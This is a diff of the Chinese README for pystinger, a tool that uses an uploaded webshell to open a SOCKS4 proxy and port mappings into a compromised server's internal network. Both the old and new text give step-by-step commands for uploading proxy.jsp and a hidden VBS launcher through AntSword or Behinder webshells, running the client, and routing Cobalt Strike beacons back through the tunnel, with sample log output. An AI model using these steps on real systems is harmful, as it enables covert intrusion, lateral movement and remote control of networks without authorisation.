@@ -1,12 +1,20 @@
-# 毒刺(pystinger_for_darkshadow)
-毒刺(pystinger_for_darkshadow)是一个通过webshell实现**内网SOCK4代理**,**端口映射**.工具主体使用python开发,当前支持php,jsp(x),aspx三种代理脚本.
+# 毒刺(pystinger)
+
+毒刺(pystinger)通过webshell实现**内网SOCK4代理**,**端口映射**.
+
+可直接用于metasploit-framework,viper,cobalt strike上线
+
+主体使用python开发,当前支持php,jsp(x),aspx三种代理脚本.
+
 # 使用方法
 
 ## SOCK4代理
-* proxy.jsp上传到目标服务器,确保 [http://192.168.3.11:8080/proxy.jsp](http://192.168.3.11:8080/proxy.jsp)可以访问,页面返回 stinger XXX!
+
+* proxy.jsp上传到目标服务器,确保 [http://192.168.3.11:8080/proxy.jsp](http://192.168.3.11:8080/proxy.jsp) 可以访问,页面返回 stinger XXX!
 * 将stinger_server.exe和stinger_server.vbs上传到目标服务器,蚁剑/冰蝎执行```stinger_server.vbs```启动服务端
-(修改vbs中路径,不要直接运行exe文件,会导致tcp断连)
-* stinger_client命令行执行```./stinger_client -w http://192.168.3.11:8080/proxy.jsp -l 0.0.0.0 -p 60000```,生成如下输出表示成功
+> 修改vbs中exe路径,不要直接运行exe文件,会导致tcp断连
+* stinger_client命令行执行```./stinger_client -w http://192.168.3.11:8080/proxy.jsp -l 0.0.0.0 -p 60000```
+* 如下输出表示成功
 ```
 root@kali:~# ./stinger_client -w http://192.168.3.11:8080/proxy.jsp -l 127.0.0.1 -p 60000
 2020-01-06 21:12:47,673 - INFO - 619 - Local listen checking ...
@@ -37,10 +45,12 @@ root@kali:~# ./stinger_client -w http://192.168.3.11:8080/proxy.jsp -l 127.0.0.1
 * 此时已经在本地60000启动了一个192.168.3.11所在内网的socks4代理
 
 ## cobalt strike单主机上线
-* proxy.jsp上传到目标服务器,确保 [http://192.168.3.11:8080/proxy.jsp](http://192.168.3.11:8080/proxy.jsp)可以访问,页面返回 stinger XXX!
+
+* proxy.jsp上传到目标服务器,确保 [http://192.168.3.11:8080/proxy.jsp](http://192.168.3.11:8080/proxy.jsp) 可以访问,页面返回 stinger XXX!
 * 将stinger_server.exe和stinger_server.vbs上传到目标服务器,蚁剑/冰蝎执行```stinger_server.vbs```启动服务端
-(修改vbs中路径,不要直接运行exe文件,会导致tcp断连)
-* stinger_client命令行执行```./stinger_client -w http://192.168.3.11:8080/proxy.jsp -l 0.0.0.0 -p 60000```,生成如下输出表示成功
+> 修改vbs中路径,不要直接运行exe文件,会导致tcp断连
+* stinger_client命令行执行```./stinger_client -w http://192.168.3.11:8080/proxy.jsp -l 0.0.0.0 -p 60000```
+* 如下输出表示成功
 ```
 root@kali:~# ./stinger_client -w http://192.168.3.11:8080/proxy.jsp -l 127.0.0.1 -p 60000
 2020-01-06 21:12:47,673 - INFO - 619 - Local listen checking ...
@@ -67,20 +77,23 @@ root@kali:~# ./stinger_client -w http://192.168.3.11:8080/proxy.jsp -l 127.0.0.1
 2020-01-06 21:12:47,703 - WARNING - 502 - socks4a server start on 127.0.0.1:60000
 2020-01-06 21:12:47,703 - WARNING - 509 - Socks4a ready to accept
 ```
-* cobalt strike添加监听,端口选择RAT Config中的Handler/LISTEN中的端口(通常为60020),beacons为127.0.0.1
+* cobalt strike添加监听,端口选择输出信息RAT Config中的Handler/LISTEN中的端口(通常为60020),beacons为127.0.0.1
 * 生成payload,上传到主机运行后即可上线
 
 ## cobalt strike多主机上线
-* proxy.jsp上传到目标服务器,确保 [http://192.168.3.11:8080/proxy.jsp](http://192.168.3.11:8080/proxy.jsp)可以访问,页面返回 stinger XXX!
+
+* proxy.jsp上传到目标服务器,确保 [http://192.168.3.11:8080/proxy.jsp](http://192.168.3.11:8080/proxy.jsp) 可以访问,页面返回 stinger XXX!
 * 将stinger_server.exe上传到目标服务器
 * 修改stinger_server.vbs,示例如下:
 ```
 Set ws = CreateObject("Wscript.Shell")
 ws.run "cmd /c D:\XXXXX\stinger_server.exe 192.168.3.11",vbhide
 ```
-(192.168.3.11可以改成0.0.0.0)
-*蚁剑/冰蝎执行```stinger_server.vbs```启动服务端
-* stinger_client命令行执行```./stinger_client -w http://192.168.3.11:8080/proxy.jsp -l 0.0.0.0 -p 60000```,生成如下输出表示成功
+> 192.168.3.11可以改成0.0.0.0
+
+* 蚁剑/冰蝎执行```stinger_server.vbs```启动服务端
+* stinger_client命令行执行```./stinger_client -w http://192.168.3.11:8080/proxy.jsp -l 0.0.0.0 -p 60000```
+* 如下输出表示成功
 ```
 root@kali:~# ./stinger_client -w http://192.168.3.11:8080/proxy.jsp -l 127.0.0.1 -p 60000
 2020-01-06 21:12:47,673 - INFO - 619 - Local listen checking ...
